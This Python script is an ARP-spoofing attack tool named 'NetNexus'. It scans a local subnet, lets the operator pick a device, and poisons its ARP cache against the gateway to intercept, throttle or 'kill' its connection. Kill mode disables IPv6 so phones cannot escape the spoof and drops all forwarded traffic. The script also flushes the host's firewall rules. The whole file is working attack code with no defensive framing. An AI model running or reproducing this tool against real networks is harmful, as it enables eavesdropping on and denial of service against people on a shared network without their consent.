import scapy.all as scapy
import os, time, sys, subprocess, threading
from core import scanner, spoof

# Shared memory for the background scanner
device_memory = {}
stop_scanner = False

def set_forwarding(state):
    """Controls IP forwarding and firewall rules for maximum attack impact."""
    if state:
        # Intercept mode: Enable forwarding
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv6.conf.all.disable_ipv6=0"], capture_output=True)
        subprocess.run(["sudo", "iptables", "-F"], capture_output=True)
        subprocess.run(["sudo", "iptables", "-P", "FORWARD", "ACCEPT"], capture_output=True)
    else:
        # Kill mode: Disable forwarding and execute IPv6 "Execution"
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"], capture_output=True)
        # Modern phones use IPv6 to bypass ARP spoofing; this stops them.
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv6.conf.all.disable_ipv6=1"], capture_output=True)
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv6.conf.default.disable_ipv6=1"], capture_output=True)
        subprocess.run(["sudo", "iptables", "-F"], capture_output=True)
        subprocess.run(["sudo", "iptables", "-A", "FORWARD", "-j", "DROP"], capture_output=True)

def background_scanner(ip_range):
    global device_memory, stop_scanner
    while not stop_scanner:
        device_memory = scanner.scan(ip_range, device_memory)
        time.sleep(0.5)

def main():
    global device_memory, stop_scanner
    iface = "wlan0" # Change to match your 'ip a' output
    scapy.conf.iface = iface
    
    if os.geteuid() != 0:
        print("[-] NetNexus requires root (sudo).")
        return

    gateway_ip = "192.168.8.1"
    ip_range = "192.168.8.1/24"

    # Start fast scanner thread
    scan_thread = threading.Thread(target=background_scanner, args=(ip_range,), daemon=True)
    scan_thread.start()

    while True:
        print("\n" + "="*45)
        print("      NetNexus: 1000 Pkts/s (Final Build)")
        print("="*45)
        
        current_list = list(device_memory.values())
        for index, dev in enumerate(current_list):
            print(f"{index}\t{dev['ip']}\t\t{dev['name']}")
        
        print("-" * 45)
        print("[R] Refresh  [C] Exit")
        
        user_input = input("\nSelect ID: ").lower().strip()
        if user_input == 'c': 
            stop_scanner = True
            sys.exit()
        if user_input == 'r': continue
        
        try:
            target = current_list[int(user_input)]
            print(f"\n[1] Intercept [2] Limit [3] Kill")
            mode = input("Action: ").strip()

            gateway_mac, _ = spoof.get_device_info(gateway_ip)
            
            if mode == "3":
                set_forwarding(False)
                wait_time = 0.001 # Max speed
            else:
                set_forwarding(True)
                wait_time = 0.5

            print(f"[*] Attacking {target['ip']}...")
            while True:
                spoof.spoof(target['ip'], gateway_ip, target['mac'], gateway_mac)
                time.sleep(wait_time) 
                
        except Exception as e:
            print(f"[-] Error: {e}")
            break
        except KeyboardInterrupt:
            set_forwarding(True)
            spoof.restore(target['ip'], gateway_ip)
            print("\n[*] Resetting Network...")
            break

if __name__ == "__main__":
    main()
